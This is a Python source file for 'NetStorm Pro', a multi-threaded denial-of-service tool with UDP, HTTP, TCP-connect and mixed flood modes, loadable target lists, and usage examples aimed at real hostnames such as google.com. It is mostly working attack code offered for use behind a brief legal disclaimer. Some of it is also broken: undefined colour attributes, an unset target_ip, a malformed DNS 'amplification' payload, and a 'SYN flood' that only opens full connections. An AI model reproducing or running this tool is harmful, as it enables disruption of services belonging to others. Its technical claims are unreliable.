#!/usr/bin/env python3
"""
🌪️ NetStorm Pro - Advanced Network Testing Suite
Multi-protocol network analysis and stress testing tool
Developer: Ghost Developer (@CHICO-CP)
Telegram: @Gh0stDeveloper
"""

import socket
import threading
import time
import sys
import os
import random
import argparse
from datetime import datetime

# =============================================
# CONFIGURATION AND CONSTANTS
# =============================================

class Colors:
    """ANSI color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class AttackMethods:
    """Available attack methods"""
    UDP_FLOOD = "udp_flood"
    TCP_SYN = "tcp_syn"
    HTTP_FLOOD = "http_flood"
    DNS_AMP = "dns_amplification"
    MIXED = "mixed"
    CUSTOM = "custom"

# =============================================
# CORE NETSTORM CLASS
# =============================================

class NetStormPro:
    def __init__(self):
        self.attack_stats = {
            'packets_sent': 0,
            'errors': 0,
            'start_time': None,
            'active_threads': 0,
            'targets_processed': 0
        }
        self.running = True
        self.targets = []

    def clear_screen(self):
        """Clear terminal screen"""
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_banner(self):
        """Display banner"""


        banner = f"""
{Colors.PURPLE}{Colors.BOLD}
 _  _ ___ _____ ___ _____ ___  ___ __  __ 
| \| | __|_   _/ __|_   _/ _ \| _ \  \/  |
| .` | _|  | | \__ \ | || (_) |   / |\/| |
|_|\_|___| |_| |___/ |_| \___/|_|_\_|  |_|
{Colors.CYAN}Advanced Multi-Target Network Testing Suite v3.0{Colors.END}

{Colors.YELLOW}╔══════════════════════════════════════════╗
{Colors.YELLOW}║           DEVELOPED BY GHOST    DEVELOPER     ║
{Colors.YELLOW}║        GitHub: github.com/CHICO-CP            ║
{Colors.YELLOW}║      Telegram: t.me/Gh0stDeveloper            ║
{Colors.YELLOW}╚══════════════════════════════════════════╝{Colors.END}
"""
        print(banner)

    def show_help(self):
        """Display comprehensive help information"""
        help_text = f"""
{Colors.CYAN}{Colors.BOLD}NETSTORM PRO - COMPLETE USAGE GUIDE{Colors.END}

{Colors.GREEN}{Colors.BOLD}BASIC USAGE:{Colors.END}
{Colors.WHITE}python3 netstorm_pro.py --target TARGET --port PORT --duration DURATION --threads THREADS{Colors.END}

{Colors.GREEN}{Colors.BOLD}ADVANCED USAGE:{Colors.END}
{Colors.WHITE}python3 netstorm_pro.py --file targets.txt --method udp_flood --duration 60 --threads 50{Colors.END}

{Colors.GREEN}{Colors.BOLD}ARGUMENTS:{Colors.END}
{Colors.YELLOW}--target, -t{Colors.END}     : Single target IP/hostname
{Colors.YELLOW}--file, -f{Colors.END}       : File with multiple targets (one per line)
{Colors.YELLOW}--port, -p{Colors.END}       : Target port (default: 80)
{Colors.YELLOW}--duration, -d{Colors.END}   : Attack duration in seconds (default: 30)
{Colors.YELLOW}--threads, -th{Colors.END}   : Number of threads per target (default: 10)
{Colors.YELLOW}--method, -m{Colors.END}     : Attack method ({Colors.CYAN}udp_flood{Colors.END}, {Colors.CYAN}tcp_syn{Colors.END}, {Colors.CYAN}http_flood{Colors.END}, {Colors.CYAN}dns_amp{Colors.END}, {Colors.CYAN}mixed{Colors.END}, {Colors.CYAN}custom{Colors.END})
{Colors.YELLOW}--help, -h{Colors.END}       : Show this help message

{Colors.GREEN}{Colors.Bold}ATTACK METHODS:{Colors.END}
{Colors.CYAN}udp_flood{Colors.END}          : High-speed UDP packet flooding
{Colors.CYAN}tcp_syn{Colors.END}            : TCP SYN flood (half-open connections)
{Colors.CYAN}http_flood{Colors.END}         : HTTP request flooding
{Colors.CYAN}dns_amp{Colors.END}            : DNS amplification attack simulation
{Colors.CYAN}mixed{Colors.END}              : Combined attack using multiple methods
{Colors.CYAN}custom{Colors.END}             : Custom payload-based attack

{Colors.GREEN}{Colors.BOLD}EXAMPLES:{Colors.END}
{Colors.WHITE}# Single target UDP flood{Colors.END}
python3 netstorm_pro.py -t 192.168.1.1 -p 80 -d 60 -th 20 -m udp_flood

{Colors.WHITE}# Multiple targets from file{Colors.END}
python3 netstorm_pro.py -f targets.txt -p 443 -d 120 -th 50 -m http_flood

{Colors.WHITE}# Mixed attack on single target{Colors.END}
python3 netstorm_pro.py -t example.com -p 53 -d 300 -th 100 -m mixed

{Colors.GREEN}{Colors.BOLD}TARGET FILE FORMAT:{Colors.END}
{Colors.WHITE}targets.txt:{Colors.END}
192.168.1.1
example.com
10.0.0.5:8080
google.com:443

{Colors.RED}{Colors.BOLD}LEGAL DISCLAIMER:{Colors.END}
{Colors.YELLOW}This tool is for authorized security testing and educational purposes only.
Unauthorized use against networks you don't own is illegal and unethical.{Colors.END}
"""
        print(help_text)
        sys.exit(0)

# =============================================
# TARGET MANAGEMENT
# =============================================

    def load_targets_from_file(self, filename):
        """Load multiple targets from text file"""
        try:
            with open(filename, 'r') as f:
                targets = []
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        # Handle format: ip:port or just ip
                        if ':' in line:
                            ip, port = line.split(':', 1)
                            targets.append((ip, int(port)))
                        else:
                            targets.append((line, 80))  # Default port
                return targets
        except FileNotFoundError:
            print(f"{Colors.RED}❌ Target file not found: {filename}{Colors.END}")
            sys.exit(1)
        except Exception as e:
            print(f"{Colors.RED}❌ Error reading target file: {e}{Colors.END}")
            sys.exit(1)

    def validate_target(self, target, port):
        """Validate target parameters"""
        try:
            # Try to resolve hostname
            socket.gethostbyname(target)
            
            # Validate port
            if not (1 <= port <= 65535):
                raise ValueError(f"Invalid port: {port}")
                
            return True
        except socket.gaierror:
            print(f"{Colors.RED}❌ Cannot resolve hostname: {target}{Colors.END}")
            return False
        except ValueError as e:
            print(f"{Colors.RED}❌ {e}{Colors.END}")
            return False

# =============================================
# PAYLOAD GENERATORS
# =============================================

    def generate_udp_payloads(self):
        """Generate UDP flood payloads"""
        return [
            os.urandom(1024),
            b'\x00' * 512,
            b'\xff' * 512,
            b'X' * 1024,
            os.urandom(512),
        ]

    def generate_http_payloads(self):
        """Generate HTTP flood payloads"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        ]
        
        payloads = []
        for ua in user_agents:
            payloads.extend([
                f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: {ua}\r\n\r\n".encode(),
                f"POST /api/data HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: {ua}\r\nContent-Length: 0\r\n\r\n".encode(),
            ])
        return payloads

    def generate_dns_payloads(self):
        """Generate DNS amplification payloads"""
        domains = ["google.com", "yahoo.com", "cloudflare.com", "akamai.com"]
        payloads = []
        
        for domain in domains:
            # Simplified DNS query payload
            query = f"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00{domain}\x00\x00\x01\x00\x01".encode()
            payloads.append(query)
            
        return payloads

    def generate_tcp_syn_payloads(self):
        """Generate TCP SYN payloads"""
        return [b'\x00' * 64]  # Minimal SYN packet simulation

# =============================================
# ATTACK METHODS
# =============================================

    def udp_flood_attack(self, ip, port, duration, thread_id):
        """UDP flood attack implementation"""
        self.attack_stats['active_threads'] += 1
        payloads = self.generate_udp_payloads()
        end_time = time.time() + duration
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.1)
            
            while time.time() < end_time and self.running:
                for payload in payloads:
                    try:
                        sock.sendto(payload, (ip, port))
                        self.attack_stats['packets_sent'] += 1
                    except:
                        self.attack_stats['errors'] += 1
                    
                    if not self.running:
                        break
                        
        except Exception as e:
            self.attack_stats['errors'] += 1
        finally:
            self.attack_stats['active_threads'] -= 1

    def http_flood_attack(self, ip, port, duration, thread_id):
        """HTTP flood attack implementation"""
        self.attack_stats['active_threads'] += 1
        payloads = self.generate_http_payloads()
        end_time = time.time() + duration
        
        try:
            while time.time() < end_time and self.running:
                for payload in payloads:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        sock.connect((ip, port))
                        sock.send(payload)
                        sock.close()
                        self.attack_stats['packets_sent'] += 1
                    except:
                        self.attack_stats['errors'] += 1
                    
                    if not self.running:
                        break
                        
        except Exception as e:
            self.attack_stats['errors'] += 1
        finally:
            self.attack_stats['active_threads'] -= 1

    def tcp_syn_attack(self, ip, port, duration, thread_id):
        """TCP SYN flood attack implementation"""
        self.attack_stats['active_threads'] += 1
        payloads = self.generate_tcp_syn_payloads()
        end_time = time.time() + duration
        
        try:
            while time.time() < end_time and self.running:
                for payload in payloads:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.5)
                        sock.connect((ip, port))
                        # Immediately close to create half-open connection
                        sock.close()
                        self.attack_stats['packets_sent'] += 1
                    except:
                        # Expected for SYN flood
                        self.attack_stats['packets_sent'] += 1
                    
                    if not self.running:
                        break
                        
        except Exception as e:
            self.attack_stats['errors'] += 1
        finally:
            self.attack_stats['active_threads'] -= 1

    def mixed_attack(self, ip, port, duration, thread_id):
        """Mixed attack using multiple methods"""
        self.attack_stats['active_threads'] += 1
        end_time = time.time() + duration
        
        try:
            while time.time() < end_time and self.running:
                # Rotate between different attack methods
                methods = [self.udp_flood_attack, self.http_flood_attack]
                method = random.choice(methods)
                
                # Run mini-attack for 2 seconds
                method_start = time.time()
                while time.time() < method_start + 2 and self.running:
                    try:
                        if method == self.udp_flood_attack:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            sock.sendto(os.urandom(512), (ip, port))
                            sock.close()
                        else:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(1)
                            sock.connect((ip, port))
                            sock.send(b"GET / HTTP/1.1\r\n\r\n")
                            sock.close()
                        
                        self.attack_stats['packets_sent'] += 1
                    except:
                        self.attack_stats['errors'] += 1
                    
                    if not self.running:
                        break
                        
        except Exception as e:
            self.attack_stats['errors'] += 1
        finally:
            self.attack_stats['active_threads'] -= 1

# =============================================
# PROGRESS AND STATISTICS
# =============================================

    def show_progress(self, duration):
        """Display real-time progress during attack"""
        start_time = time.time()
        end_time = start_time + duration
        
        while time.time() < end_time and self.running:
            elapsed = time.time() - start_time
            remaining = max(0, end_time - time.time())
            progress = (elapsed / duration) * 100
            
            self.clear_screen()
            self.print_banner()
            
            print(f"{Colors.CYAN}{Colors.BOLD}⚡ NETSTORM PRO - ATTACK IN PROGRESS{Colors.END}\n")
            
            # Current target info
            if hasattr(self, 'current_target'):
                ip, port = self.current_target
                print(f"{Colors.GREEN}🎯 Current Target:{Colors.END} {ip}:{port}")
            
            print(f"{Colors.GREEN}📊 Progress:{Colors.END} {progress:.1f}%")
            print(f"{Colors.GREEN}⏱️  Elapsed:{Colors.END} {elapsed:.1f}s / {duration}s")
            print(f"{Colors.Green}📦 Packets Sent:{Colors.END} {self.attack_stats['packets_sent']}")
            print(f"{Colors.GREEN}🚨 Errors:{Colors.END} {self.attack_stats['errors']}")
            print(f"{Colors.GREEN}🧵 Active Threads:{Colors.END} {self.attack_stats['active_threads']}")
            print(f"{Colors.GREEN}🎯 Targets Processed:{Colors.END} {self.attack_stats['targets_processed']}/{len(self.targets)}")
            print(f"{Colors.GREEN}⏳ Remaining:{Colors.END} {remaining:.1f}s")
            
            # Progress bar
            bar_length = 40
            filled = int(bar_length * progress / 100)
            bar = f"{Colors.GREEN}{'█' * filled}{Colors.WHITE}{'░' * (bar_length - filled)}{Colors.END}"
            print(f"\n[{bar}] {progress:.1f}%")
            
            time.sleep(0.5)

    def show_final_stats(self):
        """Display final attack statistics"""
        total_time = time.time() - self.attack_stats['start_time']
        
        self.clear_screen()
        self.print_banner()
        
        print(f"{Colors.CYAN}{Colors.BOLD}📊 NETSTORM PRO - ATTACK COMPLETED{Colors.END}\n")
        
        print(f"{Colors.GREEN}🎯 Targets:{Colors.END} {len(self.targets)}")
        print(f"{Colors.GREEN}⏱️  Total Time:{Colors.END} {total_time:.2f} seconds")
        print(f"{Colors.GREEN}📦 Total Packets:{Colors.END} {self.attack_stats['packets_sent']}")
        print(f"{Colors.GREEN}📈 Packets/Second:{Colors.END} {self.attack_stats['packets_sent'] / total_time:.2f}")
        print(f"{Colors.GREEN}🚨 Total Errors:{Colors.END} {self.attack_stats['errors']}")
        print(f"{Colors.GREEN}🕐 Finished:{Colors.END} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        print(f"\n{Colors.YELLOW}⚠️  LEGAL: For authorized testing only!{Colors.END}")
        print(f"{Colors.CYAN}🔗 GitHub: github.com/CHICO-CP{Colors.END}")
        print(f"{Colors.CYAN}📱 Telegram: t.me/Gh0stDeveloper{Colors.END}")

# =============================================
# MAIN EXECUTION
# =============================================

    def run_attack(self, targets, port, duration, threads, method):
        """Main attack controller"""
        self.targets = targets
        self.attack_stats['start_time'] = time.time()
        self.running = True
        
        # Method mapping
        method_functions = {
            AttackMethods.UDP_FLOOD: self.udp_flood_attack,
            AttackMethods.HTTP_FLOOD: self.http_flood_attack,
            AttackMethods.TCP_SYN: self.tcp_syn_attack,
            AttackMethods.MIXED: self.mixed_attack,
        }
        
        attack_function = method_functions.get(method, self.udp_flood_attack)
        
        # Start progress display
        progress_thread = threading.Thread(target=self.show_progress, args=(duration,))
        progress_thread.daemon = True
        progress_thread.start()
        
        print(f"\n{Colors.YELLOW}🚀 Starting NetStorm Pro attack...{Colors.END}")
        print(f"{Colors.CYAN}🎯 Targets:{Colors.END} {len(targets)}")
        print(f"{Colors.CYAN}🔧 Method:{Colors.END} {method}")
        print(f"{Colors.CYAN}⏱️  Duration:{Colors.END} {duration} seconds")
        print(f"{Colors.CYAN}🧵 Threads per target:{Colors.END} {threads}")
        print(f"{Colors.CYAN}🕐 Started:{Colors.END} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"\n{Colors.YELLOW}Press Ctrl+C to stop attack{Colors.END}\n")
        
        time.sleep(2)
        
        # Launch attacks for each target
        for target in targets:
            self.current_target = target
            ip, target_port = target
            
            # Use provided port or target's specific port
            attack_port = port if port else target_port
            
            for i in range(threads):
                thread = threading.Thread(
                    target=attack_function, 
                    args=(ip, attack_port, duration, i)
                )
                thread.daemon = True
                thread.start()
            
            self.attack_stats['targets_processed'] += 1
        
        # Wait for completion
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}🛑 Attack interrupted by user{Colors.END}")
            self.running = False
        
        self.running = False
        self.show_final_stats()

def main():
    netstorm = NetStormPro()
    netstorm.clear_screen()
    netstorm.print_banner()
    
    # Argument parser
    parser = argparse.ArgumentParser(description='NetStorm Pro - Advanced Network Testing Tool', add_help=False)
    
    # Target options
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument('--target', '-t', help='Single target IP/hostname')
    target_group.add_argument('--file', '-f', help='File containing multiple targets')
    
    # Attack parameters
    parser.add_argument('--port', '-p', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('--duration', '-d', type=int, default=30, help='Attack duration in seconds (default: 30)')
    parser.add_argument('--threads', '-th', type=int, default=10, help='Threads per target (default: 10)')
    parser.add_argument('--method', '-m', default=AttackMethods.UDP_FLOOD, 
                       choices=[AttackMethods.UDP_FLOOD, AttackMethods.TCP_SYN, 
                               AttackMethods.HTTP_FLOOD, AttackMethods.DNS_AMP,
                               AttackMethods.MIXED, AttackMethods.CUSTOM],
                       help='Attack method (default: udp_flood)')
    parser.add_argument('--help', '-h', action='store_true', help='Show help message')
    
    try:
        args = parser.parse_args()
    except:
        netstorm.show_help()
    
    if args.help:
        netstorm.show_help()
    
    # Load targets
    if args.file:
        targets = netstorm.load_targets_from_file(args.file)
    else:
        targets = [(args.target, args.port)]
    
    # Validate targets
    valid_targets = []
    for target, port in targets:
        if netstorm.validate_target(target, port):
            valid_targets.append((target, port))
    
    if not valid_targets:
        print(f"{Colors.RED}❌ No valid targets found!{Colors.END}")
        sys.exit(1)
    
    # Run attack
    try:
        netstorm.run_attack(valid_targets, args.port, args.duration, args.threads, args.method)
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}👋 Exiting NetStorm Pro...{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}❌ Error: {str(e)}{Colors.END}")

if __name__ == "__main__":
    main()